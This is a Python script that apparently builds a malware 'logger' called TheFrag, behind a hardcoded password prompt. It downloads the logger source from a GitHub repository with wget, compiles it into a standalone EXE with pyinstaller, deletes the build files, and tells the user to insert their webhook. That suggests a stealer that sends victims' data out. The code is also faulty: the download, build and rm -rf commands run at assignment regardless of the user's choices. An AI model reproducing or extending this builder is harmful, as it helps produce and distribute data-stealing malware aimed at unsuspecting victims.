# REQUIREMENTS
import os
import termcolor
from colored import fg, bg, attr
# PASSWORD MENU
print ("Welcome To The Frag Input Your Password")
x = input("Password: ")
k = os.system ("exit()")
z = int (k)
w = "Welcome To The Frag Panel"
if x == "lolsmhlol99":
    print(w)
else:
     print ("Incorrect Password")
     exit()
# MAIN MENU
print("""{0}
 _____   _   _   _____   _____   ____       _       ____
|_   _| | | | | | ____| |  ___| |  _ \     / \     / ___|
  | |   | |_| | |  _|   | |_    | |_) |   / _ \   | |  _
  | |   |  _  | | |___  |  _|   |  _ <   / ___ \  | |_| |
  |_|   |_| |_| |_____| |_|     |_| \_\ /_/   \_\  \____|

{1}""".format(fg('red'), attr(0)))
print ("{0}-W E L C O M E-{1}".format(fg('red'), attr(0)))
print ("{0} Press Enter To Create Your File{1}".format(fg('red'), attr(0)))
GUI = input("~$~ ")
print (GUI)
# VARIABLESl
install = os.system ("wget https://raw.githubusercontent.com/observerunion/TheFragLogger/main/TheFrag.py")
create = os.system ("pip3 install pyinstaller && pyinstaller --onefile TheFrag.py")
clear = os.system ("clear")
delete = os.system ("rm -rf build TheFrag.py")
# COMMANDS
ask = input("Do You Want To Install? Y/N: ")
ex = os.system ("exit()")
y = "yes"
n = "no"
o = "Installing"
if ask == "y":
    print(install)
    print(o)
if o == "n":
     print ("Cancelling...")
     exit()
     print ("please note you have to edit the frag file and put in your webhook")
c = input("Do You Want To Create The Frag As A EXE File? Y/N  ")
w = "Creating..."
if c == "y":
    print(create)
if c == "n":
     print ("Exiting...")
     exit()
